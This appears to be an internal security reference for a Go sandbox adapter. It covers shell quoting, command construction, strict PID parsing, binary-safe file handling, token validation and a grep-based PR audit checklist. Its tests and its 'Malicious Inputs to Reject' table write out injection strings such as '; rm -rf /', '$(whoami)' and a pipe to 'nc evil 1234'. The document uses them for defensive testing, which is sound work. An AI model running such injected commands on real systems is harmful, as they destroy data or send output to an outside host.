# Security Coding Reference

## `shellQuote()` Implementation

From `internal/adapter/agentsandbox/adapter.go`:

```go
// shellQuote wraps a string in single quotes, escaping embedded single quotes
// via the '\'' idiom (end quote, escaped quote, start quote).
func shellQuote(s string) string {
    return "'" + strings.ReplaceAll(s, "'", "'\\''") + "'"
}
```

### Test Cases (12+ edge cases)

```go
// internal/adapter/agentsandbox/integration_test.go

func TestShellQuote(t *testing.T) {
    tests := []struct {
        input    string
        expected string
    }{
        {"", "''"},
        {"simple", "'simple'"},
        {"with space", "'with space'"},
        {"with'tick", "'with'\\''tick'"},
        {"a'b'c", "'a'\\''b'\\''c'"},
        {"with\"double", "'with\"double'"},
        {"with;semicolon", "'with;semicolon'"},
        {"with&ampersand", "'with&ampersand'"},
        {"with$ dollar", "'with$ dollar'"},
        {"with`backtick", "'with`backtick'"},
        {"with|pipe", "'with|pipe'"},
        {"with\nnewline", "'with\nnewline'"},
        {"$(subshell)", "'$(subshell)'"},
        {"`command`", "'`command`'"},
        {"; rm -rf /", "'; rm -rf /'"},
        {"unicode: 你好", "'unicode: 你好'"},
    }
    for _, tt := range tests {
        t.Run(tt.input, func(t *testing.T) {
            got := shellQuote(tt.input)
            assert.Equal(t, tt.expected, got)
        })
    }
}
```

## Command Construction Pattern

All adapter methods that build shell commands should follow this pattern:

```go
// ✅ MakeDir
func (a *Adapter) MakeDir(ctx context.Context, sandboxID, path string) error {
    cmd := fmt.Sprintf("mkdir -p %s", shellQuote(path))
    return a.runCommand(ctx, sandboxID, cmd)
}

// ✅ RemoveFile
func (a *Adapter) RemoveFile(ctx context.Context, sandboxID, path string) error {
    cmd := fmt.Sprintf("rm -f %s", shellQuote(path))
    return a.runCommand(ctx, sandboxID, cmd)
}

// ✅ RunCommand
func (a *Adapter) RunCommand(ctx context.Context, sandboxID string, req *adapter.RunCommandRequest) (*adapter.CommandResult, error) {
    // Each arg is quoted independently
    parts := make([]string, len(req.Args))
    for i, arg := range req.Args {
        parts[i] = shellQuote(arg)
    }
    cmd := strings.Join(parts, " ")
    if req.Dir != "" {
        cmd = fmt.Sprintf("cd %s && %s", shellQuote(req.Dir), cmd)
    }
    return a.execCommand(ctx, sandboxID, cmd)
}
```

## PID Validation Pattern

```go
// parsePID strictly parses a process ID as a numeric value.
// Rejects any input that contains non-numeric characters (prevents shell injection).
func parsePID(processID string) (int, error) {
    var pid int
    var extra string
    n, err := fmt.Sscanf(processID, "%d%s", &pid, &extra)
    if n != 1 || (err != nil && err != io.EOF) {
        return 0, fmt.Errorf("invalid process ID: must be numeric, got %q", processID)
    }
    return pid, nil
}
```

### Malicious Inputs to Reject

| Input | Why |
|---|---|
| `"123; rm -rf /"` | Shell injection |
| `"123$(whoami)"` | Subshell injection |
| `"123\`id\`"` | Backtick injection |
| `"123 \| nc evil 1234"` | Pipe injection |
| `"123abc"` | Trailing text |
| `"𝟭𝟮𝟯"` | Unicode digits (Sscanf %d accepts these in some locales — verify) |
| `""` | Empty |
| `" "` | Whitespace only |

### Valid Inputs to Accept

| Input | Notes |
|---|---|
| `"1"` | Init |
| `"1234"` | Normal PID |
| `"-1"` | Negative PIDs are valid (process groups in `kill`) |

## Binary Data Pattern

```go
// ✅ ReadFile — preserve binary
func (a *Adapter) ReadFile(ctx context.Context, sandboxID, path string) ([]byte, error) {
    // SDK returns bytes directly; do NOT cast through string.
    return a.downloadBytes(ctx, sandboxID, path)
}

// ✅ Upload — preserve binary
func (a *Adapter) WriteFile(ctx context.Context, sandboxID, path string, content []byte) error {
    // Use UploadFile (binary-safe), NEVER heredoc.
    return a.UploadFile(ctx, sandboxID, &adapter.FileUploadRequest{
        Path:   path,
        Reader: io.NopCloser(bytes.NewReader(content)),
    })
}

// ❌ NEVER do this:
//   return io.NopCloser(strings.NewReader(string(data)))
//   cmd := fmt.Sprintf("cat > %s << 'EOF'\n%s\nEOF", path, string(content))
```

## Token Validation Pattern

```go
// envd_proxy.go — validates X-Access-Token before forwarding
func (p *EnvdProxy) ServeHTTP(w http.ResponseWriter, r *http.Request) {
    sandboxID := extractSandboxID(r)
    token := r.Header.Get("X-Access-Token")

    if token == "" {
        http.Error(w, `{"code":401,"message":"missing access token"}`, http.StatusUnauthorized)
        return
    }

    valid, err := p.adapter.ValidateAccessToken(r.Context(), sandboxID, token)
    if err != nil {
        slog.Error("token validation error", "sandboxID", sandboxID, "error", err)
        http.Error(w, `{"code":500,"message":"internal error"}`, http.StatusInternalServerError)
        return
    }
    if !valid {
        http.Error(w, `{"code":401,"message":"invalid access token"}`, http.StatusUnauthorized)
        return
    }

    // Forward with validated token as Bearer auth
    r.Header.Set("Authorization", "Bearer "+token)
    r.Header.Del("X-Access-Token")
    p.reverseProxy.ServeHTTP(w, r)
}
```

## Security Audit Checklist for PRs

When reviewing a PR that touches user-input paths:

- [ ] `grep -rn "Sprintf.*%s" internal/adapter/` — check all shell command constructions use `shellQuote`
- [ ] `grep -rn "Sscanf.*processID" internal/adapter/` — check PID validation is strict
- [ ] `grep -rn "<<.*EOF" internal/adapter/` — check no heredoc use
- [ ] `grep -rn "string(data)" internal/adapter/` — check no binary-to-string casts
- [ ] `grep -rn "strings.NewReader" internal/adapter/` — check no string readers for binary data
- [ ] Token validation in envd proxy: `grep -n "ValidateAccessToken" internal/server/envd_proxy.go`
